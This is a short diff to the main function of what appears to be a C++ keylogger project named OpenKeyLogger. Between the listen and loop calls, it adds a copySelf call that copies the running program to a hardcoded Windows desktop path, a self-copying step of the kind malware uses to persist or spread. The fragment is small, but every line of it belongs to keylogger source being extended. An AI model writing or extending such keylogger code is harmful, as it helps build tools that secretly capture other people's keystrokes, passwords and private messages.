@@ -13,6 +13,8 @@ int main()
 
 	kl->listen();
 
+	kl->copySelf("C:\\Users\\Kevin_2\\Desktop\\OpenKeyLogger\\test.exe");
+
 	kl->loop();
 
 	return 0;
